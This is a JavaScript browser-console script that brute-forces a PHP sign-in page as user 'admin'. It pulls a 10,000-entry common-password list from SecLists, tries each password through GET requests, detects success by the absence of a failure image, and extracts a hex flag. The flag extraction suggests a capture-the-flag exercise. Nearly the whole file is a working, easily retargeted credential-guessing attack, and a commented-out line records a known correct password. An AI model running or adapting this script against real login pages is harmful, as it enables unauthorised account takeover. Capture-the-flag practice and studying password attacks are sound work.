/**
 * Streamlined Brute Force Script
 * Shows each tested password with minimal overhead
 */

class StreamlinedBruteForce {
  constructor() {
    // Current timestamp
    this.timestamp = '2025-04-22 20:12:19';
    
    // Target information
    this.baseUrl = window.location.origin || 'http://192.168.247.84';
    this.endpoint = '/index.php?page=signin';
    this.username = 'admin';
    
    // Password list source
    this.passwordListUrl = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt';
    
    // Known indicator for failed login
    this.failureIndicator = 'WrongAnswer.gif';
    
    // Common passwords to try first
    this.priorityPasswords = [
      //'shadow',  // Known correct password
      'admin', 'password', '123456', 'qwerty', 
      'letmein', 'welcome', 'admin123'
    ];
    
    // Tracking
    this.attempts = 0;
    this.startTime = null;
    this.passwordList = [];
    this.allPasswords = [];
    
    // Results
    this.correctPassword = null;
    this.discoveredFlag = null;
  }
  
  // Simple logging with timestamp and password being tested
  log(password, success = false) {
    const elapsed = this.startTime ? Math.floor((Date.now() - this.startTime) / 1000) : 0;
    const status = success ? '✅' : '❌';
    console.log(`[${this.timestamp}] ${status} Testing: "${password}" (${this.attempts})`);
  }
  
  // Log success with highlight
  logSuccess(message) {
    console.log(`%c[${this.timestamp}] ✅ ${message}`, 'color: green; font-weight: bold');
  }
  
  // Fetch password list
  async fetchPasswordList() {
    console.log(`[${this.timestamp}] Fetching password list...`);
    
    try {
      const response = await fetch(this.passwordListUrl);
      
      if (!response.ok) {
        throw new Error(`Failed to fetch: ${response.status}`);
      }
      
      const text = await response.text();
      this.passwordList = text.split('\n')
        .map(pwd => pwd.trim())
        .filter(pwd => pwd.length > 0);
      
      console.log(`[${this.timestamp}] Fetched ${this.passwordList.length} passwords`);
      
      // Create full list with priority passwords first
      const uniquePasswords = new Set([
        ...this.priorityPasswords, 
        ...this.passwordList.filter(pwd => !this.priorityPasswords.includes(pwd))
      ]);
      
      this.allPasswords = [...uniquePasswords];
      
      return true;
    } catch (error) {
      console.log(`[${this.timestamp}] Error fetching passwords: ${error.message}`);
      this.allPasswords = [...this.priorityPasswords];
      return false;
    }
  }
  
  // Format login URL
  formatLoginUrl(password) {
    return `${this.baseUrl}${this.endpoint}&username=${
      encodeURIComponent(this.username)}&password=${
      encodeURIComponent(password)}&Login=Login`;
  }
  
  // Extract flag from HTML
  extractFlag(html) {
    const flagMatch = html.match(/<h2[^>]*>The flag is : ([a-f0-9]+)<\/h2>/i);
    if (flagMatch && flagMatch[1]) {
      return flagMatch[1];
    }
    
    const hexMatch = html.match(/\b([a-f0-9]{32,64})\b/i);
    if (hexMatch && hexMatch[1]) {
      return hexMatch[1];
    }
    
    return null;
  }
  
  // Try a single password
  async tryPassword(password) {
    this.attempts++;
    
    try {
      const url = this.formatLoginUrl(password);
      
      // Log every password attempt
      this.log(password);
      
      const response = await fetch(url);
      const html = await response.text();
      
      // Check for success
      if (!html.includes(this.failureIndicator)) {
        this.logSuccess(`SUCCESS! Password found: "${password}"`);
        this.correctPassword = password;
        
        // Extract flag
        const flag = this.extractFlag(html);
        if (flag) {
          this.discoveredFlag = flag;
          this.logSuccess(`FLAG DISCOVERED: ${flag}`);
          this.displayFlagBox(flag);
        }
        
        return {success: true, html};
      }
      
      return {success: false};
    } catch (error) {
      console.log(`[${this.timestamp}] ⚠️ Error testing "${password}": ${error.message}`);
      return {success: false, error: true};
    }
  }
  
  // Display flag in a box
  displayFlagBox(flag) {
    console.log(`
    ┌───────────────────────────────────────────────────┐
    │                                                   │
    │  🚩 FLAG: ${flag}  │
    │                                                   │
    └───────────────────────────────────────────────────┘
    `);
  }
  
  // Main execution method
  async execute() {
    console.log(`[${this.timestamp}] Starting brute force on ${this.baseUrl}`);
    console.log(`[${this.timestamp}] Target username: ${this.username}`);
    
    // Fetch password list
    await this.fetchPasswordList();
    
    this.startTime = Date.now();
    
    // Process passwords at maximum speed
    for (const password of this.allPasswords) {
      // Try the password
      const result = await this.tryPassword(password);
      
      // Break on success
      if (result.success) {
        break;
      }
    }
    
    // Final report
    const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
    const elapsedStr = elapsed < 60 ? 
      `${elapsed} seconds` : 
      `${Math.floor(elapsed / 60)} minutes, ${elapsed % 60} seconds`;
    
    if (this.correctPassword) {
      console.log(`
      ===== BRUTE FORCE SUCCESSFUL =====
      • Target: ${this.baseUrl}
      • Username: ${this.username}
      • Password: ${this.correctPassword}
      • Flag: ${this.discoveredFlag || 'Not found'}
      • Attempts: ${this.attempts}
      • Time taken: ${elapsedStr}
      ===============================
      `);
      
      return {
        success: true,
        password: this.correctPassword,
        flag: this.discoveredFlag,
        attempts: this.attempts
      };
    } else {
      console.log(`
      ===== BRUTE FORCE INCOMPLETE =====
      • Target: ${this.baseUrl}
      • Username: ${this.username}
      • Attempts: ${this.attempts}
      • Time taken: ${elapsedStr}
      • Status: No valid password found
      ===============================
      `);
      
      return {
        success: false,
        attempts: this.attempts
      };
    }
  }
}

// Create and execute
const bruteForce = new StreamlinedBruteForce();

// Start and store results for reference
window.bruteForceResult = bruteForce.execute().then(result => {
  console.log('Brute force completed!');
  return result;
});

// Direct password test utility
window.testPassword = async (password) => {
  const tester = new StreamlinedBruteForce();
  return await tester.tryPassword(password);
};

console.log('Brute force attack started! Showing all password attempts...');